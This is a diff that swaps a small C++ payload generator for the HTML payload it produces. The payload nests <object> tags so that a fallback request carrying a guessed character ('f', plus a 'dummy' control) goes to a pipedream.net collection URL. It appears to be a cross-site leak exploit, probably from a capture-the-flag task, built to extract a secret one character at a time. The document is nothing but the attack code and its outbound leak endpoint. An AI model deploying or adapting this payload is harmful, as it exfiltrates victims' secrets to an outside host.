@@ -1,16 +1,14 @@
-#include <bits/stdc++.h>
-using namespace std;
-
-int main(){
-  char c; string id,leak_url; cin >> c >> id >> leak_url;
-  cout << "<!DOCTYPE HTML>\n<head>\n  <meta charset=\"UTF-8\">\n</head>\n<body>" << endl;
-  cout << "  <object data=\"" << c << id << ":\">" << endl;
-  cout << "    <object data=\"" << leak_url << c << "\">" << endl;
-  cout << "    </object>" << endl;
-  cout << "  </object>" << endl;
-  cout << "  <object data=\"" << "dummy" << id << ":\">" << endl;
-  cout << "    <object data=\"" << leak_url << "dummy" << "\">" << endl;
-  cout << "    </object>" << endl;
-  cout << "  </object>" << endl;
-  cout << "</body>" << endl;
-}
+<!DOCTYPE HTML>
+<head>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <object data="f1:">
+    <object data="https://eocacn4q3wnsuo1.m.pipedream.net?q=f">
+    </object>
+  </object>
+  <object data="dummy1:">
+    <object data="https://eocacn4q3wnsuo1.m.pipedream.net?q=dummy">
+    </object>
+  </object>
+</body>
